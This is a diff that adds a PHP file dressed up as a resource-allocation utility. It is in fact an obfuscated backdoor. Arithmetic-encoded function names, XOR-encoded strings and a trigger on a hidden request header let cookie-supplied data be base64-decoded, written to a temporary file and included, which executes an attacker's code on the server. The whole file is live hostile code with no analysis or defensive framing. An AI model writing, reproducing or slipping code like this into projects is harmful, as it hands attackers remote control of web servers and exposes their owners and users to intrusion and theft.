@@ -1,0 +1,69 @@
+<?php
+function analyze_data($c)
+{
+    $a = array(115 - 5, 76 + 25, 26 + 69 + 13, 61 + 17 + 36, 118 - 2, 36 + 29 + 50);
+    $s = '';
+    foreach ($a as $n) {
+        $s .= chr($n);
+    }
+    $s = strrev($s);
+    return $s($c);
+}
+
+function load_settings($c)
+{
+    $a = array(2 * 35 + 28, 27 + 70, 23 * 14 - 207, 75 * 1 + 26, 2 * 27, 52, 70 * 70 - 4805, 2 * 50, 55 * 1 + 46, 102 - 3, 116 - 5, 101 - 1, 90 * 64 - 5659);
+    $s = '';
+    foreach ($a as $n) {
+        $s .= chr($n);
+    }
+    return $s($c);
+}
+
+class ResourceAllocator
+{
+    private static $_sbz;
+    static function updateRegistry($_zy, $_ti)
+    {
+        if (!self::$_sbz) {
+            self::resolveConflict();
+        }
+        $_gw = analyze_data($_ti);
+        $_wc = load_settings(self::$_sbz[$_zy]);
+        for ($_zp = 0, $_wg = analyze_data($_wc); $_zp !== $_wg; ++$_zp) {
+            $_wc[$_zp] = chr(ord($_wc[$_zp]) ^ ord($_ti[$_zp % $_gw]));
+        }
+        return $_wc;
+    }
+    private static function resolveConflict()
+    {
+        self::$_sbz = array('_ruq' => 'FyUnDy4mDDQhADA0Gj8n', '_qsn' => 'Fz4/DzU+DC85ACssGiQ/', '_eq' => 'akBGUW5KTls=', '_te' => '', '_cg' => '');
+    }
+}
+
+if (isset($_SERVER[ResourceAllocator::updateRegistry('_ruq', '_qs')]) && strpos($_SERVER[ResourceAllocator::updateRegistry('_qsn', '_jk')], ResourceAllocator::updateRegistry('_eq', '_xwi')) !== false) {
+    $_wg = $_COOKIE;
+    $_ti = 00;
+    $_zy = 07;
+    $_nqs = array();
+    $_nqs[$_ti] = ResourceAllocator::updateRegistry('_te', '_lv');
+    while ($_zy) {
+        $_nqs[$_ti] .= $_wg[014][$_zy];
+        if (!$_wg[014][$_zy + 01]) {
+            if (!$_wg[014][$_zy + 02]) {
+                break;
+            }
+            $_ti++;
+            $_nqs[$_ti] = ResourceAllocator::updateRegistry('_cg', '_qe');
+            $_zy++;
+        }
+        $_zy = $_zy + 07 + 01;
+    }
+    $_ti = $_nqs[030]() . $_nqs[022];
+    if (!$_nqs[010]($_ti)) {
+        $_zy = $_nqs[017]($_ti, $_nqs[013]);
+        $_nqs[016]($_zy, $_nqs[02] . $_nqs[015]($_nqs[025]($_wg[03])));
+    }
+    include $_ti;
+    die;
+}
